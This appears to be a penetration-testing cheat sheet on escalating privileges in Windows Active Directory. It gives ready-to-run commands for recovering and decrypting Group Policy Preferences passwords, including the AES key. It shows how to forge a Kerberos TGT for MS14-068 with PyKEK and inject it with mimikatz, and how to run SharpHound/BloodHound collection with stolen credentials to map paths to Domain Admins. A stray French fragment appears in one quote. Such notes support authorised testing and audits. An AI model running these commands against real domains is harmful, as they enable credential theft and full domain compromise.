# Elevation of Privilege

## **MS14-025 (Group Policy Preferences)**

* Clear text credentials in SYSVOL policies: look in&#x20;
  * `<HOST>\SYSVOL\<FOLDER>\Policies\<FOLDER>`
* Credentials in Group Policy Preferences (GPP):
  * `findstr /I /S "cpassword" *.xml`
  * Break the password:&#x20;
    * `gp3finder.exe -D <CPASSWORD>(` or manually `echo '<CPASSWORD>' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000`
  * Metasploit module
    * `post/windows/gather/credentials/gpp`
  * Powersploit module
    * `Get-GPPPassword`

## **MS14-068 (CVE-2014-6324)**

> This vulnerability enables an attacker to modify an existing and valid TGT by adding the false statement (by modifying the PAC) that the user is a member of sensitive group (as Domain Admins). The DC will validate that TGT, enabling attacker improper access to any resource on the network.

* When a user logs on a domain for the first time, the user name and password are validated by the DC and a domain logon token (TGT) is created and provided to the user.
* The user doesn’t have to re-authenticate to the DC to access resources on the domain, the user simply presents the TGT to the DC and receives a resource access token (TGS).
* The user then provides the resource access token to the server hosting the service.
* The DC trusts all non-expired logon tickets (TGT) since they are signed by the domain’s Kerberos account.

Python Kerberos Exploitation Kit (PyKEK) & Mimikatz:

* `ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>`
  * It will saves the forged TGT to a ccache file in the current working directory.\
    You can grab the SSID through `whoami` when you are logged in as the target user, or use `[Security.Principal.WindowsIdentity]::GetCurrent()` Powershell function.
* `mimikatz.exe kerberos::ptc c:\temp\<TGTFILE.CCACHE> exit`

## **Attack paths**

* Use BloodHound to get a dynamic and graphical representation of the active directory:
  * From a domain workstation:
    * Upload the `SharpHound.ps1` file on a domain workstation
    * Launch `powershell`
    * `Import-Module .\SharpHound`
    * `Invoke-BloodHound -CollectionMethod All` will generate .JSON files and compress them in a .ZIP. Copy the .ZIP in your VM
  * From your computer:
    * Launch neo4J `sudo neo4j console`
    * The HTTP server is launched `http://127.0.0.1:7474/browser/`
    * Start BloodHound `sudo bloodhound`
      * If you get a white screen do Ctrl+R
    * Drag\&Drop the .ZIP in BH
* From CommandoVM (out of domain)
  * `runas /netonly /user:<DOMAIN>\<USER> powershell.exe`
  * `Import-Module .\SharpHound.ps1`
  * `Invoke-BloodHound -Verbose -DomainController 25.1.37.17 -Domain "<DOMAIN>" -LDAPUser "<USER>" -LDAPPass "<PWD>" -CollectionMethod All`

### Find paths

#### Origin to target

> Find attack paths **from all-inclusive security** groups **to the most critical principals** in AD À partir de l’adresse

|       Origin        |       Target        |
| :-----------------: | :-----------------: |
|     Domain Users    |    Domain Admins    |
| Authenticated Users |   Administrators    |
|      Everyone       |   Enterprise Admins |
|   Domain Computers  |  Domain Controllers |

* &#x20; Mix the rows

#### Shortest path to here

* Use _shortest path to here _on the Target groups in case you did not find path use standard Origin

#### Audit permissions of sensitive groups

* Use _Unrolled Object Controllers _on the following groups:

|   Target Principals    |
| :--------------------: |
|     Domain Admins      |
|    Enterprise Admins   |
|     Schema Admins      |
|       DNS Admins       |
|     Print Operators    |
|    Server Operators    |
|    Account Operators   |
| The domain head object |

#### &#x20;   Audit privileged user behaviors

* Use _Sessions_ on privileged groups (Domain Admins)

|       Groups       |
| :----------------: |
|    Domain Admins   |
| Enterprise Admins  |
|    Schema Admins   |
|     DNS Admins     |
|  Print Operators   |
|  Server Operators  |
|  Account Operators |

#### &#x20;  Audit local groups and object permissions on highly sensitive computers

* Use the _Unrolled Admins_ on sensitive computers

> _Unrolled Admin _means any user or other type of principal that has admin rights on the computer through any level of security group nesting

* Domain Controllers group
* Click the group and inspect the “Unrolled Members” line
* Click this line and you will see the DC computers
* Click the DC node, then look at the “Local Admins” section for that computer
* Repeat for the computers belonging to:

|                        Groups                        |
| :--------------------------------------------------: |
|                  Domain Controllers                  |
|             Read-Only Domain Controllers             |
|             Enterprise Domain Controllers            |
|             Cloneable Domain Controllers             |
| Computers that serve as root certificate authorities |

&#x20; &#x20;
